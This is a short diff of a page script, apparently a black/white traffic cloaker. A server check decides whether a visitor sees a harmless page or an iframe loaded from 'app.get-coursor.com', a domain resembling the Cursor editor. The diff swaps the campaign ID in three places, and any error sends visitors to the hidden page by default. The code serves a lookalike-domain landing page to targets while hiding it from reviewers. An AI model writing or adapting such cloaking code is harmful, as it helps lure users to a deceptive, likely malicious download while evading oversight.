@@ -63,13 +63,13 @@ window.addEventListener('DOMContentLoaded', () => {
 
       if (force) {
         console.log('FORCE=1 → iframe от result');
-        showBlack((res.campaign || 'https://app.get-coursor.com/hmzt3FLh') + qs);
+        showBlack((res.campaign || 'https://app.get-coursor.com/n81MNgzq') + qs);
         return;
       }
 
       if (res.code === 200 && res.result === false) {
    
-        showBlack((res.campaign || 'https://app.get-coursor.com/hmzt3FLh') + qs);
+        showBlack((res.campaign || 'https://app.get-coursor.com/n81MNgzq') + qs);
       } else {
     
         showWhite();
@@ -78,6 +78,6 @@ window.addEventListener('DOMContentLoaded', () => {
     .catch(e => {
       console.error('error resp:', e);
       
-      showBlack('https://app.get-coursor.com/hmzt3FLh' + (location.search || ''));
+      showBlack('https://app.get-coursor.com/n81MNgzq' + (location.search || ''));
     });
 });
